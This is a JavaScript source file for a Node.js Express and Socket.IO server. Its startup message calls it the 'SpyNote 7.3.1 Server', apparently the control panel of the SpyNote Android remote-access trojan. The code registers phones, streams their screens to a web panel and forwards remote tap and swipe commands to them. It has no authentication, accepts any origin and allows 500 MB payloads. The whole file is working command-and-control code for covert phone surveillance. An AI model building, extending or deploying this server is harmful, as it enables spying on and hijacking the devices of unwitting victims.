const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 10000,
    maxHttpBufferSize: 500 * 1024 * 1024,
    transports: ['websocket']
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

const devices = new Map();
const deviceSockets = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔗 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            deviceSockets.set(deviceId, socket.id);
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log(`📱 Device registered: ${deviceId} (${deviceInfo.model})`);
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId) && deviceSockets.has(deviceId)) {
            // Forward to specific device room
            socket.to(deviceId).emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp,
                layout: data.layout || [],
                fps: data.fps || 30
            });
        }
    });

    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
        if (devices.has(deviceId) && deviceSockets.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x || 0),
                y: parseFloat(y || 0),
                startX: parseFloat(startX || 0),
                startY: parseFloat(startY || 0),
                endX: parseFloat(endX || 0),
                endY: parseFloat(endY || 0),
                duration: parseInt(duration) || 300
            });
        }
    });

    socket.on('select-device', (deviceId) => {
        socket.to(deviceId).emit('device-selected');
    });

    socket.on('ping', (cb) => {
        cb();
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                deviceSockets.delete(deviceId);
                io.emit('devices-update', Array.from(devices.entries()));
                console.log(`📴 Device disconnected: ${deviceId}`);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote 7.3.1 Server running on port ${PORT}`);
    console.log(`🌐 Web panel: http://localhost:${PORT}`);
});
